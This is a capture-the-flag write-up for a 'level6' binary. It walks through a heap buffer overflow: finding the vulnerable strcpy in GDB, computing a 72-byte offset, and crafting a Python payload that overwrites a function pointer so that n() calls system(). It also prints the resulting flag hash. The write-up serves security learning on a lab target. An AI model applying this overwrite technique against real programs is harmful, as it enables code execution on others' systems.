## level6
The `level6` can be bypassed by bringing you another disturbing creation from the mind of one sick animal who can use a **buffer overflow** and get you stupified.<br>
We are already getting comfortable with this strategy let see what we have here straight
```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f4  _init
0x08048340  strcpy                           <---- Vunerable
0x08048340  strcpy@plt
0x08048350  malloc
0x08048350  malloc@plt
0x08048360  puts
0x08048360  puts@plt
0x08048370  system
0x08048370  system@plt
0x08048380  __gmon_start__
0x08048380  __gmon_start__@plt
0x08048390  __libc_start_main
0x08048390  __libc_start_main@plt
0x080483a0  _start
0x080483d0  __do_global_dtors_aux
0x08048430  frame_dummy
0x08048454  n                             <---- Never called (So here is the bounty)
0x08048468  m
0x0804847c  main
0x080484e0  __libc_csu_init
[...]
```
Dsisassembling `main()` we can see two call to `malloc()` 
```
0x08048485 <+9>:	movl   $0x40,(%esp)
0x0804848c <+16>:	call   0x8048350 <malloc@plt>
0x08048491 <+21>:	mov    %eax,0x1c(%esp)
0x08048495 <+25>:	movl   $0x4,(%esp)
0x0804849c <+32>:	call   0x8048350 <malloc@plt>
```
We know from the disassembled code that those `0x40 (64) bytes` will be the buffer where `strcpy()` will copy the argument we passed at the start of the prgram and
the `x04` will be used to store the __address__ of the function `m()` in the *heap* that the only purpose in life *(yes functions now have a life :p)* is to print __*Nope*__ and
as you may guess by now, our only purpose in life *(does hackers have a life ?)* is to write enough garbage in the buffer passed to `strcpy()` and put the __address__
with the `n()` function that contains the `system()` call into those `0x4 bytes` *heap* __address__ .
<br> Let's go back to our friendly website [buffer-overflow-generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) and grab the 200 characters long poison,
next let's fire up `GDB` and see what we can do: <br>
```
(gdb) r [pattern]
Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
```
Writing a buffer large enough we can go outside the boundary of the `64 bytes` __address__ and overwirte the pinter in the *heap* to the `m()` function with the 
`n()` function __address__.<br>
If we go back to *buffer-overflow-generator* and paste this __address__ *(0x41346341)* in *Find the offset*  we get our **offset** `72`<br> find the `n()` function __address__
```
(gdb) disas n
   0x08048454 <+0>:	push   %ebp                      <---- here we have it (remember little end first)
   0x08048455 <+1>:	mov    %esp,%ebp
   0x08048457 <+3>:	sub    $0x18,%esp
   0x0804845a <+6>:	movl   $0x80485b0,(%esp)
   0x08048461 <+13>:	call   0x8048370 <system@plt>
   0x08048466 <+18>:	leave
   0x08048467 <+19>:	ret
```
<br>now all we need to do is create a string with
72 random caracters plus the `n()` __address__, it should look like something like this<br>
```
python -c "print 'A' * 72 + '\x54\x84\x04\x08'" > /tmp/poison

~$ ./level6 `cat /tmp/poison`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
